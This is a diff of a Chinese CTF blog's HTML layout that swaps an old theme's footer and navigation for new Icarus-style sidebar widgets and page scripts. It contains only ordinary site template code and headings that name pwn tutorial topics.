dateTime="2021-11-17T07:42:49.020Z">2021-11-17</time></p><p class="title"><a href="/2021/11/17/hitcontraining_uaf/">堆漏洞uaf</a></p><p class="categories"><a href="/categories/%E5%A0%86/">堆</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-16T03:46:35.570Z">2021-11-16</time></p><p class="title"><a href="/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a></p><p class="categories"><a href="/categories/pwn/">pwn</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-15T03:25:42.853Z">2021-11-15</time></p><p class="title"><a href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/">babyheap_0ctf_2017</a></p><p class="categories"><a href="/categories/pwn/">pwn</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/pwnable/"><span class="level-start"><span class="level-item">pwnable</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%A0%86/"><span class="level-start"><span class="level-item">堆</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/logo.png" alt="y1seco&#039;blog" height="28"></a><p class="size-small"><span>&copy; 2021 y1seco</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© <a href="http://www.beian.miit.gov.cn/" target="_blank">川ICP备88888888号-8（测试）</a><br></span><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
+            var n = new Date(time);
+            now.setTime(now.getTime() + 250),
+                days = (now - n) / 1e3 / 60 / 60 / 24,
+                dnum = Math.floor(days),
+                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
+                hnum = Math.floor(hours),
+            1 == String(hnum).length && (hnum = "0" + hnum),
+                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
+                mnum = Math.floor(minutes),
+            1 == String(mnum).length && (mnum = "0" + mnum),
+                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
+                snum = Math.round(seconds),
+            1 == String(snum).length && (snum = "0" + snum),
+                document.getElementById("statistic-times").innerHTML = "❤️本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！❤️";
+        }var now = new Date();setInterval("createTime('2021/11/11 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('46a9f3481b46ea0129d8','79c7c9cb847e141757d7864453bcbf89f0655b24','removeif','blog_comment',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
 
-  </div>
-</article>
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
 
+        function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };
 
-
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.</span> <span class="toc-text">一. 基础知识补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ret2text"><span class="toc-number">2.</span> <span class="toc-text">二. ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-ret2libc"><span class="toc-number">3.</span> <span class="toc-text">三. ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">泄露libc利用思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A2018-rop"><span class="toc-number">3.2.</span> <span class="toc-text">例题：2018_rop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%9D%83%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">四.  利用mprotect修改内存权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROPgadget%E4%BD%BF%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">ROPgadget使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-32%E4%BD%8D%EF%BC%8C64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AF%B9%E6%AF%94"><span class="toc-number">5.</span> <span class="toc-text">五. 32位，64位栈溢出对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E8%A6%86%E7%9B%96%E7%9B%B8%E5%85%B3%E5%8F%98%E9%87%8F"><span class="toc-number">6.</span> <span class="toc-text">六. 覆盖相关变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83-BUUCTF-%E4%BE%8B%E9%A2%98"><span class="toc-number">7.</span> <span class="toc-text">七. BUUCTF 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-JarvisOJ-level4"><span class="toc-number">7.1.</span> <span class="toc-text">1. JarvisOJ level4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">7.1.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP"><span class="toc-number">7.1.2.</span> <span class="toc-text">WP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jarvisoj-level3-x64"><span class="toc-number">7.1.3.</span> <span class="toc-text">jarvisoj_level3_x64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bjdctf-2020-babyrop2"><span class="toc-number">7.1.4.</span> <span class="toc-text">bjdctf_2020_babyrop2</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number"></span> <span class="toc-text">pwn2_sctf_2016</span></a>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&text=栈溢出"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&is_video=false&description=栈溢出"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=栈溢出&body=Check out this article: http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&name=栈溢出&description=&lt;p&gt;ret2libc，fmtstr&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&t=栈溢出"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2016-2021
-    y1seco
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/projects_url">项目</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
- 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Umami Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-</body>
-</html>
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(true){
+                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('46a9f3481b46ea0129d8','79c7c9cb847e141757d7864453bcbf89f0655b24','removeif','blog_comment',false);});
+            }
+            if(false){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });</script></body></html>
